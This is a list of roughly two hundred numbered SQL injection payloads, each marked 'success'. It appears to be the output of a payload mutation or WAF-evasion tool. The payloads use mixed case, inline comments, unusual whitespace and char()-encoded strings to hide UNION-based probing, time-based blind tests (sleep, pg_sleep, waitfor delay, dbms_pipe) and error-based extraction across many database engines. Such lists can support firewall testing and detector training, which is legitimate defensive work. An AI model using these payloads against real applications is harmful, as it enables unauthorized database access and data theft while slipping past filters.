405 success '0x1"   )    )    union all select null,null,null,null,null# MJ'
406 success "1'+  (  SElEct dgnt WhErE 4701  =  4701 AND 5425 IN (5424,5425,5426) OR 7427   lIke   dbms_pipe.receive_message  (  chr  (  116  )  ||chr  ( /**/87  )  ||chr  (  90  ) /**/||chr  (  109  )  ,5  )  -- "
408 success '(sElEcT 0x1)%"   )    )     )   && 0xa9c   like     (  SelecT count  (  *  )   FRoM sysusers as sys1,sysusers\x0bAS sys2,sysusers AS sys3,sysusers As sys4,sysusers As sys5,sysusers as sys6,sysusers aS sys7  )/**/ -- '
410 success "seLect likE  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    And    (    (   'nimx'   lIke   'nimx "
412 success "select pg_sleep  (  0x5\x0c )   AND 'zfyy'   LIKE   'zfyy "
415 success 'SElEcT   (  case wHEn   (/**/ (SelECT 4061)   LiKe   0x574  )   THen/**/0xfdd eLSE 0x1/  (  sElECt (SeleCT 0)  )   eNd  ) /**/-- '
417 success "(sElect 1)  )   As qodq WhErE 0x1351   LIke  \t4945 anD '\t'<>'\ti' oR 9643  =    (  seleCt count  (  *  )   fROm domain.domains aS t1,domain.columns\tAS t2,domain.tables aS t3  )  -- -I"
418 success "(SEleCt (selEcT 1))%'  )   aND 2716  =    (  SeLECt count  (  *\n )   fRoM sysusers/**/aS sys1,sysusers AS sys2,sysusers As sys3,sysusers AS sys4,sysusers aS sys5,sysusers As sys6,sysusers as/**/sys7  )  -- "
419 success "1'\xa0waitfor delay '0x0:0x0:0x5' and 'vwuz'  =  'vwuz/**/"
425 success "0x1%' and char  (  120  )  ||char  (  0x6a  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  ' "
429 success '  (  seLEct * From   (  selecT  (  sleep  (  5   )    )     )  srmq  )   anD   (  "avyw"   like   "avyw '
431 success "0x1'||  (  select 'xmoq'/*#w,\x0c*/from dual\x0cwhere ''8V<' LIKE ''8V<' and 7533  = \t7533 OR 'n' NOT LIKE 'n' OR False AND 1 OR 0  )  ||' "
434 success 'SelEct caSE wHEN\x0b9390  =\x0b 5752 tHen 1 ElsE null End-- jV7'
438 success "1'\x0b )  \xa0as chla wHErE/**/6098   LIKE   6098 OR ';'<>';' "
440 success 'sElECT count  (  *  )   FrOM domain.domains as t1,domain.columns aS t2,domain.tables As t3 And    (    (   "vqpx"/**/likE "vqpx '
442 success 'select   ( /**/case when  /**/(  9986   like   8342  )   then 9986 else 9986*  (  select 9986/**/from information_schema.character_sets  )   end  )  # '
443 success "0x1   ) /**/  )     OR  8315   liKE     (  seLeCT count  ( /**/*  )   FroM sysibm.systables as t1,sysibm.systables As t2,sysibm.systables aS t3  )   AND    (/**/   (   'PFE-' NOT LIKE 'PFE-j' or False "
444 success "(SELECT 1)'/**/ )\xa0  AnD 0x1d6d   LIkE /*%0*/ 0x1d6d\x0b"
445 success '0x1"   )    )     )   union all select null,null,null,null,null,null,null,null,null-- '
447 success '0x1"  )   as pobe\tWHERE 1704   liKe /**/\x0b(SELECt 1704) '
448 success '0x1/*wY*/where 2292  = /**/2292 union all select null,null,null,null# '
450 success 'SELECt sleep  (  5  )   AND    (/**/   ( /**/   (  "%"  =  " '
451 success "-7868'\x0biN boolean mode  )   union all selECt 5117,5117,5117,5117,5117,5117,5117,5117,5117# 7g"
452 success ' SELeCT sleep\x0c (  (SELECT 5)  )   and "%"  =  " '
454 success '0x1"   )    ) /**/  and 0x190e  =    (  select count  (  *  )\t  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   /* E)!j*/(    (   "kldp" like "kldp '
455 success 'SeleCt   (  CaSE WhEn\t  (  7254  = /*Nq*/5901  )   tHEN 1 Else 7254*  (  seleCT 7254 from master..sysdatabases  )   ENd  )  -- '
457 success '(SELECT 0x1)"  )  /**/as ebvt/**/whErE/*j\t\tW\r*/\'uZ\'\'\nNOT/**/LIKE \'uZ\'P\'\x0c'
458 success "(SelECT (SELECT 1))%'\x0b )   union all SELECt null#/*;oP_*/Of^a"
459 success '-9871"  )  /**/union all SELEcT 9082# x'
460 success "-6368'/**/union\tall sELeCT\x0b6529,6529,6529-- \th"
461 success '0x1   )    )    aNd 9254  =    (  seLecT count  (  *  ) \n FrOM rdb$fields aS t1,rdb$types as t2,rdb$collations AS t3,rdb$functions As t4  )  -- c'
462 success '(SELECT 1),  (  SEleCt   (  caSe WhEN   (  1570   LIke /**/ 1570  )   THen   (  SelecT 1570 From pg_sleep  (  5\x0c  )    )    ElsE 1/  (  SelECT 0  )   ENd   )    )    '
463 success '(SEleCt (SELECT 1))"   )/**/ \t )    aS nncz WhEre \'TGv\'<>\'TGv\\\' '
464 success '0x1" &&\nexp  (  ~  (  SeleCT * FrOM   (  SeLECT concat  (  0x7171706a71,  (  SELeCT   (  elt \xa0(  8190  =  0x1ffe,0x1   )  \x0c )     )  ,0x717a767a71,0x78   )    )   x   ) /*{*/  )    '
465 success "(SELECT 1)'+  (  select fhbk where 2570  =  2570 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +' "
468 success "0x1' /**/)   and 0x2142  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3/**/ )   and   (  'wmrr' like 'wmrr "
470 success 'SeLECT CAsE wHEN 7951  =  1147\ntHEn 1 ElSE null END--\t'
472 success '(SELECT 0x1)"/**/  )    )    AS rrms wheRe \'^\' LIKE \'^\' union all selECt null,null,null,null,null,null,null,null-- '
479 success '0x1"/*\r O*/ )   as nyzd WhERe (SELECT 0xf5a) LIkE 3930 and \'S6\' NOT LIKE \'S6Z\'\x0c'
480 success '0x1  )   AS qeav whERe 8127  =  8127 And 4241  =  convert  (  int,  (  sElect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  SELECt   (  caSe wheN   (  4241  =  4241  )   tHeN char  (  (SeLECt 49)  )   elSe char  (  48  )   eNd   )    )   +char\xa0 (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- _t'
481 success '\tselect */**/from users where id\xa0 =  0x1 or ".]" OR 5705!=5706 AND True -- 1 '
482 success 'sElECT count  (\x0b *  )   frOm domain.domains aS t1,domain.columns as t2,domain.tables AS t3 AND    (  /**//**/(     (  "%"   LIKE   " '
483 success "1'/**/  )    )    and 6510  =  \x0c (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers/**/as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'vcvj'  =  'vcvj "
487 success "(SELECT (SELECT 1))%'  )   ANd elt  (  'G W' LIKE 'G W' AND 7976 NOT LIKE 7977 OR (select 0x0),sleep  (\xa0 5   )    )   # 3W"
490 success ' sElECT * FroM users wheRe id  =  1 OR "{." oR \'rmx/\'=\'rmx/\' aND True or 0x0 -- 1 H-`'
491 success '0x1  )   AnD 6510   LiKE     (  SELECT count  (  *  )   frOM sysusers AS sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers As sys5,sysusers as sys6,sysusers as sys7  )/**/  '
494 success '(SELECT 1)" wHERE/*qj;{\x0c*/\'_65\' NOT LIKE/**/\'_65%\'\x0c'
496 success '-1591 WhERE 3291 /**/= \t3291 union all seleCt 0xcdb,3291,3291,3291,3291,3291,3291,3291,3291# '
497 success "0x1 where 7158  =  7158 AND 9164 NOT LIKE 9165 or elt  (  'F'='F',sleep  (  0x5   )    )   # "
498 success "SeLeCt * FROM users wHErE id   like   1 +  (  1  )   oR 'O&'!='O&d' --\x0c1 "
499 success "OR 'something'   =  \xa0'some'+'thing' "
500 success '0x1"  )   WHeRE 6843  =  (SELECT 6843) OR (sELEcT 6793)   like     (  SELEcT 6793 frOM pg_sleep  (  (SELecT 5)   )    )   -- '
501 success '(SELECT 0x1)   )   \x0b)    as shmg where 0x55b   LIKE  /**/1371 union all select null,null,null,null,null,null,null,null,null,null# L"'
502 success '-7111%"\nunion all/*nYC*/sElEcT/**/6083,6083,6083,6083,6083,6083--/**/c^'
506 success 'sElEct * froM generate_series  (  1488,1488,CasE wHen   (  1488 \x0c lIKE   1685\t )   tHEN 1 eLse 0 EnD  )   limit 1-- '
507 success 'select/**/  (  case when\xa0  (  4043  =  5276  )   then (SELECT 4043) else 0xfcb*/**/ (  select (SELECT 0xfcb) from information_schema.character_sets  )   end  )  # '
510 success '0x1"   )    )    as tkmd where 3415  =  3415 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt \n(  3484  =  3484 OR False,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  -- '
511 success "0x1' in boolean mode  )   or 2367   like     ( /**/select count  (  */**/ )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- "
516 success "waitfor delay\x0c'0x0:0:5' AND\t'%'   like   ' "
518 success 'SEleCT   (  casE wHen   (  0x2453 \n LIKE   2760  )   Then 1 ElSE 9299*  (  sEleCT 9299 FroM master..sysdatabases  )   eND  )  -- r'
519 success '0x1  )\n  OR sleep/**/ (  5  )  # z'
522 success "(SELECT 0x1)'   )    )     )   and 0xe7b  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'wsmq'  =  'wsmq "
523 success "0x1' /**/) \t wHeRE 3262   likE   3262 union all SELeCt null,null,null,null,null,null,null,null,null,null# k"
527 success " (  seLECt * frOM /**/ (  seLEcT  (  sleep  (  0x5   )/**/   )     )  srmq  )   anD    (    (   'cbaj'   Like   'cbaj "
528 success '0x1%"   )    )    union all select null,null,null,null,null,null,null,null,null,null-- jz'
532 success 'sElEct   (  CaSe WHEn   (  6804  =  7050  )   thEN (SEleCt 6804) ELse cast  (  1 AS int  )  /  (  sElect 0 fRom dual  )   ENd  )   froM dual-- '
533 success "(SELECT 0x1)'+  (  select 'mtpt' where 'P'!='P9' union all select\tnull,null,null,null,null,null,null,null,null-- "
537 success 'seLecT   (  cAse wHEN   (  7645  =  5921  )   ThEN 7645 elSe 7645*  (  SELEct 7645 From information_schema.character_sets  ) \x0b end  )  # 6\r'
539 success '1/**/  )    )    AS tbiq WhEre 1174 IN (1173,1174,1175) And 8635  =    (  SELECT count  (  *  )   frOm generate_series  (  1,5000000   )    )   -- '
540 success '0x1\x0cuni/*|*/On SELect all/**/FROm WHErE '
542 success "(SELECT/**/0x1)'+\x0b (  select 'epza' where 8994  =  8994 AND 7295=7295 OR False and make_set  (  3782  =  2428,2428   )    )   +' "
544 success "1'+  (  select 'opqr' WhERe 2442  =  2442 oR 1022  =    (  SElecT count  ( /**/*  )   FrOM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- "
546 success "(SELECT 1)%'/**/and elt  (  8206!=8207 OR 'V/\n' NOT LIKE 'V/\n',sleep  (  5 \t )    )    and '%'  =  ' "
547 success '/**/select * from users where id   like   1 union select @ 1a,version  (    )   -- 1 '
550 success '0x1%" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  (SELECT 6270) AND 1,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )\xa0   )    and "%"  =  " '
551 success "0x1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  'rqyz'  =  'rqyz "
554 success "select/**/count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and  /**/ (    (  \t'wusq'  =  'wusq "
557 success "(SElEct 0x1)'   (  sEleCT   (  CASE whEN   (  8330=0x208a OR 'r'<>'r'  )   THen regexp_substring  (/*eE*/ repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000 \t)  ,null  )   ELsE char  (  108  )   OR char  (  76  )  ||char  (  112  )   or char  (  116  )   eND  )   FRoM information_schema.system_users  )   "
558 success "0x1'  )  /*B[xqp*/order by 1# "
561 success ' selEcT * fRoM users WHEre id   liKE   (seLECt 1) Or  @$#  =  1 union select 1,version  (    )   -- 1 (SELECT (SELECT\n2))'
564 success "0x1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'tfso'  =  'tfso "
565 success "-(SELECT 2679)'   )    )\n    )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  ( \x0c113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )/**/ ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'cutk' like 'cutk "
566 success '(SELECT 1)" WheRe 0x240e\x0c  LIKE /**/ 9230/**/'
569 success ' sElEct * From users WheRE id  =  1 OR @#"  (     lIkE   1 || 1147 NOT LIKE 1148 and \'o\' NOT LIKE \'o{\' -- 1 '
570 success 'SEleCT   (  cASe WHEN   (  3539   LikE   8768  )   tHEn 3539 elSe cast  (  1 As int  ) /*lQ*//  (  seLEct 0 FROM dual  )   enD \n)   fROM dual-- '
576 success '0x1"  )   and   (  select * from  /**/(  select  (  sleep  (  5   )    )     )  fzno  )   and   (  "ppml"  =  "ppml '
577 success "0x1' wHeRe 9903 IN (9902,9903,9904) "
578 success '-4015"/**/wHERe 2610  =  2610 or 1 group by concat  (  0x7171706a71,  (  seLECT   (  CasE WHeN  \xa0(  4232  =  4232  )   then 1 elSe 0 ENd   )    )   ,0x717a767a71,floor  (  rand  (  0  ) \x0c*2   )    )    having MiN  (  0  )  # r'
579 success "1'+/**/ (  select 'rpds' WHERE/**/5870\x0c =\xa0 5870 OR 'p'<>'p' OR False And 4595  = /**/4595# j]fq"
580 success '(SELECT 0x1)" union all/**/sELEcT null,null,null,null,null,null,null# f'
581 success '0x1%"   )    )    or 0x20e5  =    (  select count  (  *  )   from generate_series  (  1,0x4c4b40   )    )    and    (    (   "%"  =  " '
582 success '0x1" /**/ ) /**/  )    aS hace WHere \'}AzR7\'!=\'}AzR7e\' '
583 success "-9145' /**/)  /**/as xyya where\x0c8950  =  8950 union all select 8950,8950,8950,8950,8950,(SELECT 8950),8950,8950-- G"
584 success "0x1'   )    )    and sleep  (  (SELECT (SELECT 0x5))  )   and    (    (   'tcwt'  =  'tcwt "
585 success "(SELECt (sElEcT 0x1))%'  )   union all SElect null,null,null,null,null-- "
587 success '0x1%"   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  0x254b!=9548,1   )    )     )  ,0x717a767a71   )    )    and\n   (    (   "%"  =  " '
588 success '(SELect 0x1)"/**/  )    )    or 0x1d80  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   "lide"  =  "lide '
590 success "0x1'+  (  select 'ohdf' where 1302 IN (1301,1302,1303) AND 5678   LIKE   3277-- "
591 success '-8777"\n )   AS lalf whERE 8606  =  8606 OR elt  (  4397  =/**/ 5823,5823  )  -- '
597 success '(SELECT/**/1)" and 6240  =    (  \'qqpjq\'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||\'qzvzq\'  )   and "sckh"  =  "sckh '
598 success "0x1%'/**/ )   and make_set  (\t 1458  =  3902,3902  )   and   ( /**/'%' /*M*/=  ' "
600 success "sELEcT count  (  *  )   FroM generate_series  (  1,0x4c4b40  )   aNd    (    (  /**/  ( \xa0'xori' LiKe 'xori "
602 success "(SELECT 0x1)'||  (  select 'xglm' FRoM dual/**/wHerE '<q'<>'<qy' Or False oR/*r{.E*/4240   like     (  SElEct 4240 FROm pg_sleep  ( /**/5   )    )   -- "
603 success '1 WhEre 8324 liKE 8324 rlike   (  sELECt * fROM\t  (  SElEct  (  sleep  (  5   )    )     )  sgvo  )  -- '
607 success '(seleCt 1)" WHerE 5908 NOT LIKE 5909 And \'r\' NOT LIKE \'r:\' And exp  (  ~\t (  SElEct * froM   (  SELECt concat  (  0x7171706a71,  (  SElECT   (  elt  (  7188 Like 7188 aND 2351 NOT LIKE 2352 And 1 oR \'s0\r\' NOT LIKE \'s0\r\',1\n  )    )     )  ,0x717a767a71,0x78   )    )/**/  x   )    )   -- '
610 success "(SELECT 0x1)%'  )   union all/**/select null,null-- "
611 success "-1459'   )    )     )   or 5903/**/ =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'eiet' like 'eiet "
612 success 'SeleCT dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )   OR chr  (  79  )  ||chr  (  101  )  ,5  )   FrOM dual And   (  "layz"  =  "layz '
614 success '(SELECT 1) rlike   (  SelEct * fRom   (  selEcT/**/ (  sleep  (  5   )    )     )  sgvo  )  # ewsz '
616 success '0x1 union all SelEcT null,null,null,null,null,null# '
619 success "0x1'  \t)    )    AS icik WherE 1440  =  0x5a0 && 8189  =    (  seLECt count  ( \x0b*  )   From sysibm.systables AS t1,sysibm.systables as t2,sysibm.systables aS t3  )  -- "
620 success "\xa0select * from users where id   LIKE   '0x1' union select/**/+\\.,@@VERSION --\t0x1' "
622 success "OR '/\\'<>'/\\j' /* "
625 success "(SELECT (SELECT 1))' /**/)  /**/and (SELECT 6969) \x0b=    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol "
626 success "(seleCT (SELECT 1))%'   )    )    OR   (  SeleCT * froM /*pf\n5*/ (  sElecT  (  sleep  (  (SELECT 5)   )    )     )  sddo  )  # "
628 success ' OR/**/1\t\t=  (sELeCT 1) || ""   lIKe    '
629 success 'SElEct   (  CaSe WheN  \x0b( /**/(seLECt 0x10c9)   like   (SElECT 9086) \t)   ThEn 4297 elsE (SELEct 1)/  (  SeLecT (select 0)  )   end  )  -- \x0br'
631 success '0x1 && sleep  (  (SELECT\x0b(SELECT 5))  )/**/ '
632 success '0x1"   )    ) \xa0  As nbdc WherE 4444  =  4444 union all SElect null,null-- '
638 success '-2397   )    )    AS oizy Where 3104 likE\t3104 OR False or 9045 NOT IN (9044,9045,9046) aNd True union all seLeCt 1746,1746,1746,1746,1746,1746# 5_,<W'
639 success "1'+  (  SELEcT mrdi WHerE 7451   lIKE   7451 aNd True aNd 8594   LIKE     (  seLEcT 8594 FROM pg_sleep  (  5   )    )   -- "
640 success "(SELECT (SELECT (SELECT 1)))%'  \x0b)    )  /**/  )   union all SEleCt null,null,null,null,null,null,null,null,null,null-- (;"
642 success "1'+  (/**/ select blbd where 7451  =  7451 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    ) \t x from information_schema.character_sets group by x  )  a   )    )   +' "
644 success '1/**/ )   AND 8407   lIKE     (  seleCt count  (  *  )\x0b  From generate_series  ( /**/1,5000000   )    )    '
645 success ' sELECT * From users wHERE id  =  1 || ".@" or 1  =  1 Or \'si`\' LiKE \'si`u\' -- 1 '
647 success "1'\x0c )   where 8835  =  8835 OR 0x0 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob /**/(  500000000/2   )    )      )    )   -- z"
648 success "0x1'   )    )/*RXS*/   rlike sleep  (  (SELECT 5)  ) \x0b# "
652 success "0x1'  )   WherE 'g_}B'<>'g_}B}' aNd row  (  6237,7469  )  >  (  SeLEct count  (  *  )  ,concat  (  0x7171706a71,  (  sEleCt   (  elt  (  7072 In (7071,7072,7073) && True,1   )    )     )  ,0x717a767a71,floor  ( /**/rand  (  0  )  *2   )    )   x FroM   (  selEcT 5192 union SeLEct 3785 union SelecT 3931 union SelECT 7158  )  a grOUP/**/By x \n)  -- "
654 success '(seLeCt/**/1)" wHERe \'""o\'!=\'""o#\' Qu6%G'
655 success "sELEcT LIke  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/0x2   )    )      )    )    "
658 success "0x1' where 2379 iN (2378,2379,2380) Or 2384 LikE 2385 union all SEleCT null,null,null-- "
660 success "0x1' IN boolean/**/mode  )   OR   (  SeLECT * fROM   (  SelEcT  (  sleep  (  0x5   )    )     )  ydpu  )  # vS"
661 success "1'+  (  select ukwc where 1101 LIKE 1101 OR False aNd 4428 NOT LIKE 4429 OR False AND 1867 NOT LIKE 1868 Or   (  sElECt * FROM   (  sEleCt  (  sleep  (  0x5   ) \xa0 /**/)     )  sddo  )  # L"
665 success "(SELECt 0x1)  )   as\nodqn wherE (SElECT 3910)   lIkE   3910 anD '^X0t' LIKE '^X0t' "
669 success '-7041"   ) /**/  )    /*5pC*/)   union all SeLect 0x86f,2159,2159,0x86f,0x86f--\twmii'
670 success "-1272'/**/or 1 group by concat  (\n 0x7171706a71,  (  select   (  case when   (  'u'<>'u\\'  )   then 1 else 0 end   )    )/*G*/  ,0x717a767a71,floor  (  rand  (  (SELECT 0)  )  *2   )    )    having min  (  0x0  )  # "
672 success '-4091"/**/  )    )     )   union all select 6694,6694-- '
673 success 'sEleCt   (  cASe WHeN   (  7033  =  1594  )   ThEN 7033 ELse 7033*  ( \x0cSeLECt 7033 From information_schema.character_sets  )   eNd  )  # '
674 success '(sELect (SELECT 1))"  ) /*F|$^q*/ as/**/semi/**/WHere 4260  \xa0likE  /**/4260 '
676 success "0x1' \x0c)   wheRE 6434 not like 6435 And 1 OR 4411  =    (  SeLEct count  (  *  )   FRoM sysusers as sys1,sysusers AS sys2,sysusers aS sys3,sysusers AS sys4,sysusers AS sys5,sysusers as sys6,sysusers AS sys7  )  -- W{"
679 success "seLECT benchmark  (  5000000,md5  (  0x4c4d6142   )    )    ANd    (   /**/(     (  '%'   lIkE   ' "
680 success "select dbms_pipe.receive_message /**/(  chr  (  0x42  )  ||chr\n (  (SELECT 67)  ) \n||chr  (  (SELECT 0x4f)  )  ||chr  (  101  )  ,5  )   from dual  )  ||' "
681 success "0x1'   )    )    and 7533  =  7533 and/**/   (    (\x0b  'ialm'  =  'ialm "
683 success "(SELECT (SELECT 1))'  )   as mqxb where 6496  =\t 0x1960 AND 'BS'!='BS1' aNd 7533/**/ =  7533-- mY}"
685 success "0x1%'  )   and   (  0x2559 NOT LIKE 9562 AND True  )  *6703 and   ( /**/'%'  =  ' "
686 success "(SELECT 1) OR (SELECT 0x113b)  =    (  SeLECT count  (  * \x0c)   FRoM sysusers aS\x0csys1,sysusers AS sys2,sysusers aS sys3,sysusers As sys4,sysusers As sys5,sysusers\x0bAS sys6,sysusers AS/**/sys7  ) /*&cz'4*/-- ctdx \t "
689 success ' seLEcT * frOm users WHeRe id  =  1.*1 union sElEct 1,banner FROm v$version WhEre rownum  =  1 -- 1 Ge'
693 success "waitfor/**/delay\t'0:0:5' and 'gsvt'   LIKE   'gsvt "
694 success "-5008' union/**/all Select/**/1942,1942,1942,1942,1942,1942,1942,(SELECT 1942)-- "
698 success '0x1"   )    )    AS eglv WHeRE \'iO\'!=\'iOV\' union\x0ball SeLecT null#\tsh'
700 success "(SELECT 0x1)' OR 2367   liKe \n   (  sEleCT count  (  *  )   FROm rdb$fields AS t1,rdb$types as/**/t2,rdb$collations As t3,rdb$functions AS/**/t4  )  -- K"
703 success "(SELECT (SELECT 1))%'   )    )   /**/ )   union all select null,null,null,null# "
705 success 'SeLeCT pg_sleep  (  0x5  )   aNd    (    (  /**/"qani"   lIKE   "qani '
707 success "0x1  )   WheRe ' '='\n'/*|2>1*/AND elt  (  1210  =  1210 AND 2753=2753 OR 'J-'!='J-' AND 1,sleep  (  5   )    )   -- "
709 success '-0x24d8   )    )    as nqya WHEre 8387  =  8387 AND 4849!=4850 OR elt  (  9242  =  6180,6180  )  -- '
711 success "0x1'  )   OR 2367  =    (/**/ seLECt/**/count  (  *  )   FROm rdb$fields aS\nt1,rdb$types As t2,rdb$collations as t3,rdb$functions AS t4  )  -- "
712 success "0x1'  )   as syer where '%e&'<>'%e&c' rlike   (  select   (  case when   (  6233  = \x0c7567  )   then 1 else 0x28 end   )    )   -- "
715 success ' SeLEct * FrOm users WhErE id  =  (SeLecT 1) or 1#"? OR 7633 IN (7632,7633,7634) -- 1 '
717 success "0x1'  )   or 0x113b/**/ =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as\x0bsys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'wgbh'  =  'wgbh "
722 success "1'+  (  selEcT nash WheRe 4159  =  4159 union all SElect null# "
723 success '(SELECT 1) /*Os6)Q*/ )    )     ) /**/ && 8635   LiKE     ( \nselEcT count  (  *  )   fROM generate_series  (  0x1,0x4c4b40/**/  )   \x0c)   -- w'
726 success "1'\x0cwhERe 0x24c8  =\x0b/*Z$\rQ*/9416/**/"
727 success 'select  /**/(  case/**/when   (  5418  =  6516  )   then 1 else 5418*  (  select 5418 from master..sysdatabases  )   end  )  -- '
729 success "-(SELECT 8186)%' or elt  ( \x0c6261 LIKE 6261,3623  )   and '%'  =  ' "
730 success '-1487"  )   As crfi WherE 4978 not like 4979 aNd 1 or\nFalse OR False and 1 AND \'t.\'=\'t.\' union all selECT 2407,2407,(seLEct 2407),2407,2407,2407,2407,2407,2407,2407-- 8<'
732 success 'SeLEct count  (  *  ) \n/*S^9%*/From generate_series  (  1,5000000  )   anD "ihbe" LIKE "ihbe '
733 success '-4286%"  /**/)/**/   ) /**/   )   union all SELEcT 2229,2229,2229,2229,2229,2229# '
735 success '0x1%"   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (   \t(     (  "%"  =  " '
737 success '-0xb68"   )    )    AS zdgv wHErE 9702   LikE   9702 oR 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106\t )  +char  (  113  )  +  (  seLECt   (  caSE wHEn /*|l\r&*/ (  2724   like   2724  )   THeN char  (  49  )   ElSE char  (  48  )   EnD   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )\t +char  (  113   )    ) \xa0   )  -- '
741 success '1/**/where 0x1b5<>(SELECT 438) '
742 success "0x1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables/**/as t2,sysibm.systables as t3  )   and    (    (   'ijyi'  =  'ijyi "
746 success 'SElEcT CASe WHEn 3661   LIkE /**/ 0x2463 THEN 1\teLse null EnD-- lz'
747 success "(SELECT (SELECT 1))'   )    )     )  /*!2&h\x0c*/and (SELECT 6414)  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'msjw' like 'msjw "
749 success '0x1  )   where 9344  =  9344 '
750 success "0x1'   )    )    and 0x190e  =/**/   (  select count /**/(\x0b *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'fowu' like 'fowu "
752 success " select * from users/**/where id   like   '1' or \\<$ union select 1,@@VERSION -- 1' "
755 success "0x1%' and extractvalue  (  7982,concat  (\xa0 0x5c,0x7171706a71,  (  select   (  elt  (  'dqP'<>'dqPZ',1   )    )     )  ,0x717a767a71   )    )    and '%'  =  ' "
759 success "0x1'||  (  select 'zyvk' FRom dual wHEre 2072/*z(-2n*/\x0c lIke   2072 "
760 success "0x1   )    )    oR 2633  =  dbms_pipe.receive_message /**/(  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )   Or chr  (  103  )  ,5  )   aND    (    (   'I<GV'='I<GV' "
761 success '(SELECT 1)" WHerE 3206 IN (3205,3206,3207) union all seleCt null,null,null,null,null,null,null-- '
762 success ' sElEcT * fRoM users wherE id   LIKE  \t1 or "  (  _" OR 1  =  1 AND 9538 IN (9537,9538,9539) -- 1 '
763 success "-(SELECT 7951)'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  (SELECT 1390)<>1391  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  ( /**/118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'blak'  =  'blak "
764 success "1/**/ )   As ghew WHErE '7?'<>'7?p'/**/union all SeLECT null,null--\n"
765 success "0x1'  ) \xa0 wHErE 8291  =  (SELEct 8291) "
767 success "-6190'  )   WhEre 2621  =  2621 oR 4144  =    (  SeLect upper  (  xmltype  (  chr  (  (SelECt 60)  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sEleCT   (  CASE WhEn   (  9606 NOT LIKE 9607 And 1  )   TheN 1 elSE 0 End  )   FrOM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (/**/ 122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   frOM dual  )  -- "
770 success '0x1"   )    )\xa0   union all selECt null,null,null,null,null,null,null# '
772 success "(seLEct (SELECT 1))%'  ) /**/ and 0x1fd4/**/ =/**/ like  (  'abcdefg',upper  (  hex  (  randomblob /**/(  0x1dcd6500/0x2   ) \n  )      )   \x0b)   -- T&z`"
773 success '0x1" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and "mynm" like "mynm '
774 success 'SELEct   (  CAse WHeN   (  3863   LikE   1151  )   tHeN 3863 Else cast  (  1 aS int  )  / \t(  sElECt 0 FroM dual  )   End  )   fROM dual-- '
775 success "1'/**/iN boolean mode  )   OR sleep  (  5  )  # "
